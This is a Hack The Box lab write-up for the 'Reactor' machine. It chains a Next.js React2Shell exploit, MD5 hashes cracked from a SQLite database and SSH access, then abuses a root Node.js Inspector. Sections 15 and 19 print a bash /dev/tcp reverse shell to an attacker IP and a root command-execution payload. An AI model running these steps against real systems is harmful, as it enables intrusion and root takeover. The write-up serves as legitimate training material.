# Hack The Box — Reactor

> **Platform:** Hack The Box  
> **Target:** Reactor  
> **OS:** Linux  
> **Difficulty:** Easy  
> **Focus:** Network enumeration, Next.js, Nuclei, CVE-2025-55182, React2Shell, SQLite, credential discovery, hash cracking, SSH, Node.js Inspector, privilege escalation

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Initial Enumeration](#2-initial-enumeration)
- [3. Web Enumeration](#3-web-enumeration)
- [4. Identifying the Next.js Application](#4-identifying-the-nextjs-application)
- [5. Vulnerability Discovery with Nuclei](#5-vulnerability-discovery-with-nuclei)
- [6. Initial Access via React2Shell](#6-initial-access-via-react2shell)
- [7. Obtaining a Shell as Node](#7-obtaining-a-shell-as-node)
- [8. Application Enumeration](#8-application-enumeration)
- [9. SQLite Database](#9-sqlite-database)
- [10. Credential Discovery and Hash Cracking](#10-credential-discovery-and-hash-cracking)
- [11. SSH Access as Engineer](#11-ssh-access-as-engineer)
- [12. Local Privilege Escalation Enumeration](#12-local-privilege-escalation-enumeration)
- [13. Discovering the Node.js Inspector](#13-discovering-the-nodejs-inspector)
- [14. Connecting to the Node Inspector](#14-connecting-to-the-node-inspector)
- [15. Executing Code in the Root Node Process](#15-executing-code-in-the-root-node-process)
- [16. Root Access](#16-root-access)
- [17. Attack Chain](#17-attack-chain)
- [18. Key Takeaways](#18-key-takeaways)
- [19. Command Reference](#19-command-reference)
- [20. Final Notes](#20-final-notes)

---

# 1. Overview

Reactor is a Linux machine whose attack path combines an exposed Next.js application, a known React Server Components vulnerability, local application data stored in SQLite, weak credential storage, and an exposed Node.js Inspector running as `root`.

The complete attack path was:

```text
Port Enumeration
        ↓
HTTP on 3000
        ↓
ReactorWatch
        ↓
Next.js Identification
        ↓
Nuclei Detection
        ↓
CVE-2025-55182 / React2Shell
        ↓
Remote Code Execution
        ↓
node Shell
        ↓
reactor.db
        ↓
SQLite Users Table
        ↓
Password Hashes
        ↓
Hash Cracking
        ↓
SSH as engineer
        ↓
Local Enumeration
        ↓
127.0.0.1:9229
        ↓
Node.js Inspector
        ↓
Root Node Process
        ↓
Code Execution as UID 0
        ↓
Root Shell
```

The most important part of the machine from a methodology perspective is the transition from external enumeration to internal enumeration. The initial web access exposed the application, while the real privilege-escalation path only became visible after obtaining a local user shell.

---

# 2. Initial Enumeration

I started by performing a service and version scan against the target:

```bash
sudo nmap -sCV -Pn -O 10.129.91.226
```

The relevant results were:

```text
22/tcp   open   ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
3000/tcp open   http    Next.js application
```

Nmap initially reported the service on port `3000` as unrecognized, but the HTTP fingerprint clearly showed a Next.js application:

```text
HTTP/1.1 200 OK
X-Powered-By: Next.js
```

The presence of SSH on port 22 suggested a possible later operating-system access vector, while port 3000 immediately became the main attack surface.

---

# 3. Web Enumeration

I accessed the application directly:

```text
http://10.129.91.226:3000/
```

The page presented a dashboard called **ReactorWatch — Core Monitoring System**.

The dashboard exposed information such as:

```text
REACTORWATCH
CORE MONITORING SYSTEM v3.2.1

Core Status
Reactor Power
Neutron Flux
Control Rods
Criticality
System Logs
On-Site Personnel
```

The footer also disclosed contextual information:

```text
REACTORWATCH™ © 2025 NUCLEAR DYNAMICS CORP.
FACILITY: SITE-7
CLASSIFICATION: RESTRICTED
```

At this stage, there was no obvious login page or useful directory exposed through basic web fuzzing, so I focused on fingerprinting the application and inspecting its client-side resources.

---

# 4. Identifying the Next.js Application

The HTML response contained Next.js-specific resources under `/_next/`:

```text
/_next/static/chunks/webpack-db0a529a99835594.js
/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js
/_next/static/chunks/517-d083b552e04dead1.js
/_next/static/chunks/main-app-4fbb4b1f318e39a0.js
```

The response also contained the following header:

```text
X-Powered-By: Next.js
```

I downloaded the JavaScript chunks and searched them for common API references:

```bash
for f in $(curl -s http://10.129.91.226:3000 | grep -oE '/_next/static/chunks/[^\"]+\.js' | sort -u); do wget -q "http://10.129.91.226:3000$f"; done
```

I then checked for possible API or network-related functionality:

```bash
grep -niE 'fetch\(|axios|XMLHttpRequest|/api|http|graphql' 4bd1b696-80bcaf75e1b4285e.js 517-d083b552e04dead1.js | head -100
```

The HTML itself did not directly disclose a useful API endpoint, so I moved to automated vulnerability detection.

---

# 5. Vulnerability Discovery with Nuclei

Nuclei is a template-based vulnerability scanner developed by ProjectDiscovery. It is useful for quickly checking a target against known vulnerabilities, technologies, and security misconfigurations.

After installing and updating the templates, I scanned the application:

```bash
nuclei -u http://10.129.91.226:3000/
```

A focused scan can also be performed with:

```bash
nuclei -u http://10.129.91.226:3000/ -severity critical,high
```

The relevant finding was the React2Shell vulnerability:

```text
[CVE-2025-55182] [http] [critical]
```

This was the key breakthrough. Instead of continuing to brute-force usernames or fuzz for arbitrary web directories, the application could be attacked through the known vulnerability in the React/Next.js stack.

---

# 6. Initial Access via React2Shell

I used the Metasploit module for the React2Shell vulnerability:

```text
exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
```

The initial exploit attempt failed because Metasploit was checking port `80` instead of the actual application port `3000`:

```text
10.129.91.226:80 - No response from web service
```

I corrected the target configuration:

```text
set RHOSTS 10.129.91.226
set RPORT 3000
set TARGETURI /
```

The automatic check then reported:

```text
The target appears to be vulnerable.
```

After configuring the reverse connection parameters and executing the module, I obtained remote code execution and a shell as the `node` user.

---

# 7. Obtaining a Shell as Node

The initial shell was running in the context of the `node` account.

I confirmed the current location and application files:

```bash
cd /opt/reactor-app
ls
```

The directory contained:

```text
app
next.config.js
node_modules
package.json
package-lock.json
reactor.db
```

The presence of `package.json` was immediately interesting because it can reveal application dependencies and version information. More importantly, the presence of `reactor.db` suggested that the application was using a local SQLite database.

---

# 8. Application Enumeration

Before attempting privilege escalation, I inspected the application configuration and source files.

The most relevant files were:

```text
/opt/reactor-app/package.json
/opt/reactor-app/next.config.js
/opt/reactor-app/reactor.db
```

The database was particularly valuable because application databases often contain users, password hashes, configuration data, and other credentials.

---

# 9. SQLite Database

The database was a SQLite file, so I opened it with:

```bash
sqlite3 reactor.db
```

Once inside SQLite, I enumerated the available tables:

```sql
.tables
```

The database contained a `users` table. I inspected its structure:

```sql
.schema users
```

The table definition showed the following fields:

```text
id
username
password_hash
role
email
```

I then queried the stored accounts:

```sql
SELECT * FROM users;
```

The relevant records were:

```text
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

This exposed password hashes for both application users.

---

# 10. Credential Discovery and Hash Cracking

The hashes were 32 hexadecimal characters long, which was consistent with MD5 formatting. I used Hashcat mode `0` for MD5.

I copied the hashes to the attacking machine into a file such as:

```bash
nano hashes.txt
```

and then used:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

To display recovered passwords later:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

The cracked credentials provided valid access to the `engineer` operating-system account, which made it possible to move from the application context to a persistent SSH session.

---

# 11. SSH Access as Engineer

With the recovered credentials, I authenticated through SSH:

```bash
ssh engineer@10.129.91.226
```

I verified the account:

```bash
whoami
```

which returned:

```text
engineer
```

At this point, the initial web compromise had been converted into a real local user shell.

---

# 12. Local Privilege Escalation Enumeration

I started the local privilege-escalation enumeration with the usual checks.

### SUID binaries

```bash
find / -perm -4000 -ls 2>/dev/null
```

The results were mostly standard Ubuntu binaries such as:

```text
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/fusermount3
```

There was no immediately obvious custom SUID binary.

### Linux capabilities

```bash
getcap -r / 2>/dev/null
```

The relevant output was:

```text
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
```

Nothing here provided a clean, direct escalation path.

### Local listening services

I then checked listening TCP sockets:

```bash
ss -tlnp
```

This revealed an important localhost-only service:

```text
127.0.0.1:9229
```

Port `9229` is commonly used by the Node.js Inspector. This was a much stronger clue than the standard SUID and capability entries.

---

# 13. Discovering the Node.js Inspector

I checked which process was listening on the port:

```bash
ps aux | grep '/opt/uptime-monitor/worker.js'
```

The result showed:

```text
root  1382 ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

This was the critical discovery:

```text
PID:        1382
User:       root
Inspector: 127.0.0.1:9229
Script:     /opt/uptime-monitor/worker.js
```

I then inspected the target of the inspector:

```bash
curl http://127.0.0.1:9229/json
```

The response exposed a WebSocket debugger URL and confirmed the target script:

```text
url: file:///opt/uptime-monitor/worker.js
webSocketDebuggerUrl: ws://127.0.0.1:9229/8c9e4f3f-ddf0-4329-9ab3-fb2a5d5ecc35
```

I also inspected the JavaScript source:

```bash
cat /opt/uptime-monitor/worker.js
```

The script was an uptime monitor that periodically requested:

```text
http://127.0.0.1:3000/
```

and wrote monitoring data to:

```text
/var/log/uptime-monitor.csv
```

The source itself did not need to be modified. The important issue was that the Node process executing it was running as `root` and had debugging enabled.

---

# 14. Connecting to the Node Inspector

Because the inspector was only bound to localhost, I created an SSH tunnel from the attacking machine:

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.91.226
```

I then connected using Node's built-in debugging interface:

```bash
node inspect 127.0.0.1:9229
```

The debugger initially opened in a context that did not directly correspond to the target application. Entering:

```text
repl
```

switched into the debug REPL associated with the inspected process.

I verified the process ID:

```javascript
process.pid
```

which returned:

```text
1382
```

I then checked the UID:

```javascript
process.getuid()
```

which returned:

```text
0
```

This was the definitive confirmation that JavaScript executed through the correct inspector context was running inside the root Node process.

---

# 15. Executing Code in the Root Node Process

The normal CommonJS `require()` function was not available directly from the debugger REPL, so the built-in module interface was used instead.

The following command verified shell command execution:

```javascript
process.getBuiltinModule('child_process').execSync('id').toString()
```

The output was:

```text
uid=0(root) gid=0(root) groups=0(root)
```

At this point, the privilege escalation was effectively complete: the Node Inspector provided arbitrary JavaScript execution inside a process running as UID 0.

To obtain a shell, I used the asynchronous `exec()` method rather than `execSync()`. This distinction is important because `execSync()` waits for the command to terminate, which causes the debugger to remain blocked when launching an interactive shell.

On the attacking machine, I started a listener:

```bash
nc -lvnp 4444
```

Then, from the root Node debug REPL, I executed a reverse shell through the built-in `child_process` module:

```javascript
process.getBuiltinModule('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.196/4444 0>&1'")
```

The connection returned to the attacking machine as a root shell.

---

# 16. Root Access

After receiving the reverse shell, I verified the privilege level:

```bash
whoami
```

and:

```bash
id
```

The expected result was a root context:

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

The final root flag can then be retrieved with:

```bash
cat /root/root.txt
```

This completed the privilege-escalation chain.

---

# 17. Attack Chain

The complete compromise can be summarized as:

```text
┌─────────────────────────────────────┐
│ 1. Initial Enumeration               │
│    22 SSH / 3000 HTTP               │
└──────────────────┬──────────────────┘
                   │
                   ▼
┌─────────────────────────────────────┐
│ 2. ReactorWatch                     │
│    Next.js application              │
└──────────────────┬──────────────────┘
                   │
                   ▼
┌─────────────────────────────────────┐
│ 3. Nuclei Detection                 │
│    CVE-2025-55182                   │
└──────────────────┬──────────────────┘
                   │
                   ▼
┌─────────────────────────────────────┐
│ 4. React2Shell                      │
│    Unauthenticated RCE              │
└──────────────────┬──────────────────┘
                   │
                   ▼
┌─────────────────────────────────────┐
│ 5. Shell as node                    │
│    /opt/reactor-app                 │
└──────────────────┬──────────────────┘
                   │
                   ▼
┌─────────────────────────────────────┐
│ 6. SQLite Database                  │
│    reactor.db                       │
└──────────────────┬──────────────────┘
                   │
                   ▼
┌─────────────────────────────────────┐
│ 7. users Table                      │
│    admin / engineer hashes          │
└──────────────────┬──────────────────┘
                   │
                   ▼
┌─────────────────────────────────────┐
│ 8. Hash Cracking                    │
│    engineer credentials             │
└──────────────────┬──────────────────┘
                   │
                   ▼
┌─────────────────────────────────────┐
│ 9. SSH as engineer                  │
└──────────────────┬──────────────────┘
                   │
                   ▼
┌─────────────────────────────────────┐
│ 10. Local Enumeration               │
│     127.0.0.1:9229                  │
└──────────────────┬──────────────────┘
                   │
                   ▼
┌─────────────────────────────────────┐
│ 11. Node.js Inspector               │
│     PID 1382 / UID 0                │
└──────────────────┬──────────────────┘
                   │
                   ▼
┌─────────────────────────────────────┐
│ 12. child_process                   │
│     Command execution as root       │
└──────────────────┬──────────────────┘
                   │
                   ▼
┌─────────────────────────────────────┐
│ 13. Root Shell                      │
└─────────────────────────────────────┘
```

---

# 18. Key Takeaways

### 1. Do not stop when directory fuzzing is empty

A failed or uninteresting FFUF scan does not mean the web application has no attack surface. It only means that the specific wordlist and path-based test did not reveal anything useful.

For modern JavaScript applications, inspecting the application technology, client-side resources, APIs, and known vulnerabilities can be more valuable than endlessly increasing the fuzzing wordlist.

---

### 2. Use automated scanners as a source of leads

Nuclei quickly identified the critical React2Shell condition:

```text
[CVE-2025-55182]
```

The important point is to use the result as a lead and then understand what the vulnerability actually provides, rather than treating the scanner as a complete exploitation tool.

---

### 3. Application databases are high-value targets

After obtaining a shell as `node`, the local SQLite database immediately became interesting:

```text
/opt/reactor-app/reactor.db
```

The `users` table contained hashes that could be attacked offline. This converted application-level access into operating-system credentials.

---

### 4. Local enumeration reveals services that Nmap cannot see

The external scan only exposed:

```text
22
3000
```

After obtaining local access, `ss -tlnp` revealed:

```text
127.0.0.1:9229
```

This is a good example of why local enumeration is essential after gaining a foothold.

---

### 5. Always investigate localhost services

A service bound to `127.0.0.1` may be inaccessible remotely, but it is still part of the local attack surface once you have a shell on the machine.

The general mindset should be:

```text
External Enumeration
        ↓
Remote Services

Local Enumeration
        ↓
Remote Services
+
Local Services
+
Internal Applications
+
Debug Interfaces
```

---

### 6. Debug interfaces are extremely sensitive

The Node Inspector was enabled with:

```text
--inspect=127.0.0.1:9229
```

and the associated process was running as `root`.

A debugger attached to a privileged process effectively provides a powerful execution interface. Debug services should therefore never be exposed or enabled unnecessarily in production environments, especially inside privileged processes.

---

### 7. Understand the difference between `execSync()` and `exec()`

During exploitation, the following command successfully executed as root:

```javascript
process.getBuiltinModule('child_process').execSync('id').toString()
```

However, using `execSync()` to launch an interactive reverse shell blocks until the command exits.

Using:

```javascript
process.getBuiltinModule('child_process').exec("...")
```

allows the child process to run asynchronously, which is much more appropriate for a reverse shell.

---

### 8. Think in attack chains

Reactor was not compromised through a single isolated weakness. The final result depended on chaining several discoveries:

```text
Next.js Application
      ↓
React2Shell
      ↓
node
      ↓
SQLite Credentials
      ↓
engineer
      ↓
Local Inspector
      ↓
Root Node Process
      ↓
root
```

The key lesson is to keep enumerating after every successful step. A foothold often exposes a completely different attack surface from the one visible externally.

---

# 19. Command Reference

## Port Enumeration

```bash
sudo nmap -sCV -Pn -O 10.129.91.226
```

## Web Fingerprinting

```bash
whatweb http://10.129.91.226:3000
```

## FFUF Directory Enumeration

```bash
ffuf -u http://10.129.91.226:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
```

## Nuclei

```bash
nuclei -update-templates
```

```bash
nuclei -u http://10.129.91.226:3000/
```

```bash
nuclei -u http://10.129.91.226:3000/ -severity high,critical
```

## Download Next.js Chunks

```bash
for f in $(curl -s http://10.129.91.226:3000 | grep -oE '/_next/static/chunks/[^\"]+\.js' | sort -u); do wget -q "http://10.129.91.226:3000$f"; done
```

## Search JavaScript

```bash
grep -niE 'fetch\(|axios|XMLHttpRequest|/api|http|graphql' 4bd1b696-80bcaf75e1b4285e.js 517-d083b552e04dead1.js | head -100
```

## SQLite

```bash
sqlite3 reactor.db
```

```sql
.tables
```

```sql
.schema users
```

```sql
SELECT * FROM users;
```

## Hashcat — MD5

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

## SSH

```bash
ssh engineer@10.129.91.226
```

## SUID Enumeration

```bash
find / -perm -4000 -ls 2>/dev/null
```

## Linux Capabilities

```bash
getcap -r / 2>/dev/null
```

## Local Services

```bash
ss -tlnp
```

## Process Enumeration

```bash
ps aux | grep '/opt/uptime-monitor/worker.js'
```

## Node Inspector

```bash
curl http://127.0.0.1:9229/json
```

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.91.226
```

```bash
node inspect 127.0.0.1:9229
```

Inside the debugger:

```text
repl
```

Then verify the process and UID:

```javascript
process.pid
```

```javascript
process.getuid()
```

Verify root command execution:

```javascript
process.getBuiltinModule('child_process').execSync('id').toString()
```

Reverse shell:

```javascript
process.getBuiltinModule('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.196/4444 0>&1'")
```

Listener:

```bash
nc -lvnp 4444
```

## Root Flag

```bash
cat /root/root.txt
```

---

# 20. Final Notes

Reactor is a good example of why modern web applications require a different enumeration mindset from traditional directory-based web targets.

The initial foothold did not come from discovering an `/admin` endpoint or brute-forcing usernames. Instead, identifying the application as Next.js and using Nuclei to detect React2Shell exposed an unauthenticated RCE path.

After gaining code execution as `node`, the local SQLite database provided operating-system credentials. Once authenticated as `engineer`, local enumeration exposed a Node.js Inspector listening only on localhost. The Inspector was attached to a Node process running as `root`, turning the debugging interface into a direct privilege-escalation mechanism.

The final attack chain was:

```text
Next.js
   ↓
React2Shell / CVE-2025-55182
   ↓
RCE as node
   ↓
SQLite database
   ↓
Credential discovery
   ↓
SSH as engineer
   ↓
Local Node Inspector
   ↓
Root process
   ↓
Command execution
   ↓
root
```

**The key lesson from Reactor is to keep changing your questions as the attack surface changes: enumerate externally, understand the application, enumerate locally after obtaining a foothold, and always investigate internal services running as privileged users.**
